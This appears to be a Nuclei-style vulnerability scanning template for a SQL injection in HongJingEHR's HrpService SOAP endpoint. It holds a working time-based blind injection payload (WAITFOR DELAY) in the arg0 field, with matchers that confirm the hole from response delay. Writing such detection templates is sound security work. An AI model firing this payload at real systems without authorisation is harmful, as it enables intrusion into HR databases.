id: HongJingEHR-HrpService-sqlInjection

info:
  name: HongJingEHR-HrpService-sqlInjection
  author: iSee857
  severity: high
  description: HongJingEHR-HrpService-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /services/HrpService HTTP/1.1
        Host: {{Host}}
        Content-type:application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
          <soapenv:Body>
           <hr:processResult>
            <arg0>1);WAITFOR DELAY '0:0:5'--</arg0>
            <arg1></arg1>
           </hr:processResult>
         </soapenv:Body>
        </soapenv:Envelope>
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200